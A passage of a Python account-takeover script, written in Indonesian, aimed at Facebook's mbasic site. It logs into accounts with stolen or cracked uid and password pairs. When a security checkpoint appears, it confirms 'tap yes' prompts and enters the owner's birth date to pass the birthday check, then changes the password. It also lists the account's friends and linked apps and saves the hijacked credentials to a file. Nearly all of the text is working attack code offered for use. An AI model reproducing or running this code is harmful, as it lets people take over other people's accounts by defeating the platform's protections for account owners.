			if "(" not in str(jm_teman):
				jumlah_teman =(" [!] Tidak Bisa Menampilkan Jmlah Teman\n")
	###################################################
			try:
				c = 1
				url_ = ["https://mbasic.facebook.com/settings/apps/tabbed/?tab=active", 
						"https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive"]
				apk_dev.append(" [*] aplikasi yang terhubung ")
				for url in url_:
					iqbal_data = ses_dev.get(url)
					sop_dev = BeautifulSoup(iqbal_data.content, "html.parser")
					form_ = sop_dev.find("form", method="post")
					for dev in form_.find_all("h3"):
						try:
							apk = dev.find("span").text
							if c >= 2:
								apk_dev.append("\n ["+str(c)+"]. "+h+apk)
							else:
								apk_dev.append("\n ["+str(c)+"]. "+h+apk)

							c+=1
						except:
							pass
			except:
				pass

			if len(apk_dev) == 1:
				apk_dev.append("\n [!] Tidak ada Aplikasi yg Terkait..")
	###################################################
		except:
			jumlah_teman = ""
			jm_teman_ = ""
			pass
		data_ = data.replace(pw, pw_new_)
		if len(tap_yes) != 0:
			data =("\r [OK] %s|%s"%(uid,pw))
			data_ = data.replace(pw, pw_new_)
			if len(tampil_ttl) != 0:
				print("\r [✓] berhasil melewati sesi ttl \n"+data_+"\n"+jumlah_teman+batas)
			else:
				print("\r [*] berhasil mengganti sandi. silahkan login di mbasic \n"+data_+"\n"+jumlah_teman+"".join(apk_dev)+"\n"+batas)
			if "Nul" in jumlah_teman:
				jm_teman_ = ""
			with open("hasil_ok.txt", "a") as hasil:
				hasil.write(data_+p+jm_teman_+"\n")
			del hasil_cp[0]
			tampil_ttl = []
		else:
			if len(tampil_ttl) != 0:
				print("\r [✓] berhasil melewati sesi ttl \n"+data_+"\n"+jumlah_teman+batas)
			else:
				print("\r [*] berhasil mengganti sandi. silahkan login di mbasic \n"+data_+"\n"+jumlah_teman+"".join(apk_dev)+"\n"+batas)
			if "Nul" in jumlah_teman:
				jm_teman_ = ""
			with open("hasil_ok.txt", "a") as hasil:
				hasil.write(data_+p+jm_teman_+"\n")
			hasil_ok.append(data_)
			del hasil_cp[0]
			tampil_ttl = []

	except:
		pass

def cek_dev(uid, pw, data):
	global ganti_pw, tampil_ttl
	try:
		iqbal = uid
		uid = uid.replace("  * --> ", "")
		url = "https://mbasic.facebook.com/login"
		with requests.Session() as ses_dev:
			halaman = ses_dev.get(url).content
			sop = BeautifulSoup(halaman, "html.parser")
			form = sop.find("form", id="login_form")
			url_post  = form["action"]
			payload = {}
			for dev in form:
				input = dev
				payload[input.get("name")] = input.get("value")
			
			payloads = {
			"lsd": str(payload["lsd"]),
			"jazoest": str(payload["jazoest"]),
			"m_ts": str(payload["m_ts"]),
			"li": str(payload["li"]),
			"try_number": str(payload["try_number"]),
			"unrecognized_tries": str(payload["unrecognized_tries"]),
			"email": str(uid),
			"pass": str(pw),
			"bi_xrwh": str(payload["bi_xrwh"])
				}
			header = {
					"user-agent": "Mozilla/5.0 (Linux; Android 11; M2101K7BNY Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.120 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/323.0.0.46.119;]",
					# "user-agent": "Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]",
					# "user_agent": "Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]",
					"Host":"mbasic.facebook.com",
					"cache-control":"max-age=0",
					"upgrade-insecure-requests":"1",
					"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
					"accept-encoding":"gzip, deflate",
					"content-length": str(random.randint(100, 200)),
					"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"

					}
			respon = ses_dev.post("https://mbasic.facebook.com"+url_post, data=payloads, headers=header)
			# print respon.cookies
			# print "  * --> >",uid,"|",pw
			bug = []
			if "checkpoint" in respon.cookies:
				try:
					sop_ = BeautifulSoup(respon.content, "html.parser")
					form = sop_.find("form")
					url_post = form["action"]
					nh = sop_.find("input", attrs={"name": "nh"})["value"]
					payloads = {}
					for dev in form:
						input = dev
						payloads[input.get("name")] = input.get("value")

					payloads.update({"submit[Continue]": "Lanjutkan", "nh": nh})
					respon_ = ses_dev.post("https://mbasic.facebook.com"+url_post, data=payloads)
					
					if pw == pw_new:
						pw_new_ = pw_new+"000"
					else:
						pw_new_ = pw_new

					if "password_new" in respon_.text:
						data = data.replace("Chek", "Yes1").replace("\033[90;1m", "\033[92;1m").replace("\033[93;1m", "\033[96;1m")
						ganti_pw.append("dev")
						_iqbal_dev_pw_new_(pw_new_, data, uid, ses_dev, respon_, pw)
					if "checkpointSecondaryButton" in respon_.text:
						# print "zzzzzzzzzzzzzz"
						data = data.replace("Chek", "Yes2").replace("\033[90;1m", "\033[92;1m").replace("\033[93;1m", "\033[96;1m")
						ganti_pw.append("dev")
						bug.append("dev")
						if len(pw_tap) != 0:
							sop_dev = BeautifulSoup(respon_.content, "html.parser")
							form = sop_dev.find("form")
							url_post_ = form["action"]
							submit = sop_dev.find("input", attrs={"name": "submit[Yes]"})["value"]
							nh = sop_dev.find("input", attrs={"name": "nh"})["value"]
							payload = {}
							for dev in form:
								input = dev
								payload[input.get("name")] = input.get("value")
							payload.update({"nh": nh, "submit[Yes]": submit})
							respon_2 = ses_dev.post("https://mbasic.facebook.com"+url_post_, data=payload)
							if "password_new" in respon_2.text:
								_iqbal_dev_pw_new_(pw_new_, data, uid, ses_dev, respon_2, pw)
							else:
								pass
						else:
							# print "ttttttt"
							if len(sesi) != 0:
								print("\r [✓] akun tap yes. silahkan login di mbasic \n"+data+batas+"\n")
							else:
								suc = h+"{"+k+"Yes"+h+"}"+a
								dat_dev = data.split()
								dataku = data.replace(dat_dev[0], suc)
								print("\r [✓] akun tap yes. silahkan login di mbasic \n"+dataku+batas+"\n")
								

					sop = BeautifulSoup(respon_.content, "html.parser")
					select_dev = sop.find("select", attrs={"name": "verification_method"})
					c = 1
					option_ = []
					sesi_ttl = []
					for dev in select_dev.find_all("option"):
						
						if c >= 2:
							option_.append("\n"+p+" |_"+str(c)+k+" "+dev.text)
						else:
							option_.append("\n"+p+" \\_"+str(c)+k+" "+dev.text)

						if str(dev["value"]) == "2":
							sesi_ttl.append("2")
						c += 1

					dat = data.split()

					if len(pw_tap) != 0:
						if len(sesi_ttl) == 1 and len(dat) == 7 or len(sesi_ttl) == 1 and len(dat) == 6:
							data = data.replace("Chek", "Yes").replace("\033[90;1m", "\033[92;1m").replace("\033[93;1m", "\033[96;1m")
							if len(dat) == 6:
								_ttl_dev_ = dat[5]
							else:
								ttl_dev = dat[6].split("m")
								_ttl_dev_ = ttl_dev[1]
							
							tl_dev = _ttl_dev_.split("/")
							
							sesi_ttl = []
							sop_dev = BeautifulSoup(respon_.content, "html.parser")
							form = sop_dev.find("form")
							url_post = form["action"]
							nh = sop_dev.find("input", attrs={"name": "nh"})["value"]
							submit = sop_dev.find("input", attrs={"name": "submit[Continue]"})["value"]
							payload = {}
							for dev in form:
								input = dev
								payload[input.get("name")] = input.get("value")
							payload.update({"nh": nh, "submit[Continue]": submit, "verification_method": "2"})
							respon_ttl = ses_dev.post("https://mbasic.facebook.com"+url_post, data=payload)
							kondisi = []
							c = 1
							while True:
								c += 1
								if c == 3:
									break
								sop_dev2 = BeautifulSoup(respon_ttl.content, "html.parser")
								form = sop_dev.find("form")
								url_post_2 = form["action"]
								nh = sop_dev.find("input", attrs={"name": "nh"})["value"]
								submit = sop_dev.find("input", attrs={"name": "submit[Continue]"})["value"]
								payload = {}
								for dev in form:
									input = dev
									payload[input.get("name")] = input.get("value")
								if len(kondisi) != 1:
									payload.update({"nh": nh, "submit[Continue]": submit, "birthday_captcha_day": str(tl_dev[1]), "birthday_captcha_month": str(tl_dev[0]), "birthday_captcha_year": str(tl_dev[2])})
								else:
									kondisi = []
									payload.update({"nh": nh, "submit[Continue]": submit, "birthday_captcha_day": str(tl_dev[0]), "birthday_captcha_month": str(tl_dev[1]), "birthday_captcha_year": str(tl_dev[2])})
								respon_ttl_2 = ses_dev.post("https://mbasic.facebook.com"+url_post_2, data=payload)
								tampil_ttl.append("IqbalDev")
								ganti_pw.append("dev")
								if "checkpointSecondaryButton" in respon_ttl_2.text:
									bug.append("dev")
									sop_dev = BeautifulSoup(respon_ttl_2.content, "html.parser")
									form = sop_dev.find("form")
									url_post_ = form["action"]
									submit = sop_dev.find("input", attrs={"name": "submit[Yes]"})["value"]
									nh = sop_dev.find("input", attrs={"name": "nh"})["value"]
									payload = {}
									for dev in form:
										input = dev
										payload[input.get("name")] = input.get("value")
									payload.update({"nh": nh, "submit[Yes]": submit})
									respon_2 = ses_dev.post("https://mbasic.facebook.com"+url_post_, data=payload)
									if "password_new" in respon_2.text:
										_iqbal_dev_pw_new_(pw_new_, data, uid, ses_dev, respon_2, pw)
										break
									else:
										sop_ = BeautifulSoup(respon_2.content, "html.parser")
										form = sop_.find("form")
										url_post = form["action"]
										nh = sop_.find("input", attrs={"name": "nh"})["value"]
										submit = sop_.find("input", attrs={"name": "submit[Continue]"})["value"]
										payloads = {}
										for dev in form:
											input = dev
											payloads[input.get("name")] = input.get("value")

										payloads.update({"submit[Continue]": submit, "nh": nh})
										respon_ = ses_dev.post("https://mbasic.facebook.com"+url_post, data=payloads)
										_iqbal_dev_pw_new_(pw_new_, data, uid, ses_dev, respon_, pw)
										break

								elif "password_new" in respon_ttl_2.text:
									_iqbal_dev_pw_new_(pw_new_, data, uid, ses_dev, respon_ttl_2, pw)
									break
								else:
									kondisi.append("dev")
					else:
						pass

					if len(ganti_pw) != 0:
						ganti_pw = []
						pass
					else:
						print(+data+"".join(option_)+"\n"+batas)
					
				except:
					if len(bug) == 1:
						bug = []
						pass
					else:
						print(data+"\n"+batas)

			elif "checkpointSecondaryButton" in respon.text:
				data = data.replace("Chek", "Yes3").replace("\033[90;1m", "\033[92;1m").replace("\033[93;1m", "\033[96;1m")
				ganti_pw.append("dev")
				sop_dev = BeautifulSoup(respon.content, "html.parser")
				form = sop_dev.find("form")
				url_post_ = form["action"]
				submit = sop_dev.find("input", attrs={"name": "submit[Yes]"})["value"]
				nh = sop_dev.find("input", attrs={"name": "nh"})["value"]
				payload = {}
				for dev in form:
					input = dev
					payload[input.get("name")] = input.get("value")
				payload.update({"nh": nh, "submit[Yes]": submit})
				respon_2 = ses_dev.post("https://mbasic.facebook.com"+url_post_, data=payload)
				if pw == pw_new:
					pw_new_ = pw_new+"000"
				else:
					pw_new_ = pw_new
				_iqbal_dev_pw_new_(pw_new_, data, uid, ses_dev, respon_2, pw)
			elif "c_user" in respon.cookies:
				print("\r [*] akun tidak terkena sesi/bisa dibuka\n"+a+data+"\n"+batas)
			elif "Anda menggunakan kata sandi lama." in respon.text:
				print("\r [*] anda menggunakan kata sandi lama\n"+data+"\n"+batas)
			else:
				if "  * --> " in iqbal:
					print(data+"\n"+batas)
				else:
					pass
	except:
		if "  * --> " in iqbal: 
			print(data+"\n"+batas)
		else:
			pass
### Trigger
if __name__=='__main__':
  os.system('git pull')
  folder()
  menu()